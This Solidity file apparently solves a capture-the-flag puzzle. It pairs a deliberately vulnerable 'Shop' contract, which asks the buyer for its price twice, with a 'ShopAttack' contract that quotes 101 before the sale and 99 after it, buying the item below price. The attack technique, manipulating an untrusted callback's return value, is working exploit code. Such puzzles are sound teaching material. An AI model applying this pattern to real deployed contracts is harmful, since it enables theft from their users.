pragma solidity 0.4.24;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price.gas(3000)() >= price && !isSold) {
      isSold = true;
      price = _buyer.price.gas(3000)();
    }
  }
}

contract ShopAttack {

  function price() external view returns (uint) {
    return Shop(msg.sender).isSold() ? 99 : 101;
  }

  function attack(Shop _victim) external {
    Shop(_victim).buy();
  }
}